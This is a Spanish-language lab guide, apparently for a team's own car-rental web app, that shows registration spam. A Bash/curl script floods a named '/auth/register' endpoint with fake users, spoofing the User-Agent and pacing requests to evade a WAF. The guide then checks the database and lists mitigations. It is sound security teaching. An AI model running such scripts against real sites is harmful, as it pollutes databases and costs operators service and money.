# 🛡️ Guía del Laboratorio: Creación Masiva de Usuarios (Contaminación de Datos)

## 🎯 Objetivo
El propósito de este laboratorio es demostrar una de las vulnerabilidades lógicas más comunes en las APIs públicas: **Falta de Rate Limiting y Ausencia de Pruebas TURING (CAPTCHA)** en los formularios de registro de nuevos usuarios.

Si un endpoint como `/auth/register` no tiene defensas como reCAPTCHA, validación forzosa de correo, o bloqueos por IP temporales, un atacante puede contaminar la tabla de usuarios de la base de datos subyacente. Los impactos de este ataque son:
1.  **Agotamiento de Almacenamiento (Denegación de Servicio a nivel de BD):** Llenar de millones de filas basura la tabla hasta romper la arquitectura.
2.  **Degradación del Rendimiento:** Lentitud masiva en consultas `SELECT` (como en el panel de administrador que lista a los clientes).
3.  **Costos ocultos:** Si el sistema envía correos de bienvenida automáticos (usando SendGrid, Mailchimp, SNQ), el atacante consume tu cuota de correos de pago causando pérdidas económicas inmensas.

---

## 💣 1. El Script de Ataque (Pollution Payload)
El siguiente script interactúa con nuestro endpoint público de registro, creando un esquema de automatización rápido usando Bash y bucles de inserción.

*Nota: Hemos establecido una contraseña estandarizada y segura (`P@ssw0rd2026!`) para evitar que la validación interna `validatePasswordStrength` del backend bloquee el registro.*

```bash
#!/bin/bash
# spam_usuarios.sh - Script de contaminación de BD

echo "=== INICIANDO SPAM DE FORMULARIO DE REGISTRO ==="
CANTIDAD_USUARIOS=100
URL_TARGET="https://oceandrivecarental.com/server/public/auth/register"

for ((i=1; i<=$CANTIDAD_USUARIOS; i++)); do
    # Generador algorítmico para identidades únicas
    ID_RANDOM=$(date +%s%N | cut -b10-15)
    EMAIL="phantom${ID_RANDOM}@botnet.com"
    DOC="CC${ID_RANDOM}"

    PAYLOAD="{\"name\":\"Hacker Bot $i\",\"email\":\"$EMAIL\",\"password\":\"P@ssw0rd2026!\",\"phone\":\"+57300$ID_RANDOM\",\"nationality\":\"Colombia\",\"docType\":\"CC\",\"docNumber\":\"$DOC\"}"

    echo -n "[*] Inyectando usuario #$i ($EMAIL)... "

    # El User-Agent finge ser un navegador común
    curl -s -X POST "$URL_TARGET" \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" \
        -d "$PAYLOAD" | jq -r '.message // .error // "Error HTML/WAF"'

    # Pausa de 0.5s para evadir los límites del WAF de capa 3
    sleep 0.5
done

echo "=== VULNERABILIDAD EXPLOTADA CON ÉXITO ==="
```

---

## 🔎 2. Verificación del Daño (Comandos para el Alumno)
Una vez ejecutado el ataque, el alumno o profesor puede comprobar si los usuarios entraron correctamente en la base de datos usando el conector directo de PHP:

```bash
# Validar los últimos usuarios creados en la base de datos
php -r '
$c = require "server/src/config.php";
try {
    $pdo = new PDO("mysql:host={$c["host"]};dbname={$c["dbname"]}", $c["user"], $c["password"]);
    $stmt = $pdo->query("SELECT id, name, email, created_at FROM users ORDER BY id DESC LIMIT 5");
    $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
    echo json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
} catch (Exception $e) { echo $e->getMessage(); }'
```

Si el ataque funcionó, el output arrojará una lista de usuarios llamados `Hacker Bot`.

---

## 🛡️ 3. Estrategias de Mitigación (Para el Equipo SecOps)
Para solucionar esta vulnerabilidad (Como tarea para mejorar la seguridad del sistema), el desarrollador debe aplicar las siguientes defensas en `index.php` -> `/auth/register`:

1.  **Doble Opt-In (Verificación vía Email):** El usuario se crea en un estado `is_verified = false`. El sistema envía un token al correo. Solo los correos reales pueden validar y activar el usuario.
2.  **Integración de `RateLimiter`:** Actualmente el archivo `index.php` tiene implementado un bloqueador para los intentos de *Login* (en `/auth/login`), pero **no** para el registro. Se debe instanciar la clase `$rateLimiter` en la ruta `/auth/register` y permitir máximo 2 registros por IP cada 24 horas.
3.  **Honeypots y CAPTCHA:** Integrar Google reCAPTCHA v3 en el Frontend (Angular) y validar su token criptográfico en el backend antes de llamar a `$userModel->create()`. Al ser bots, el CAPTCHA fallará el puntaje y frenará el bucle masivo en seco.
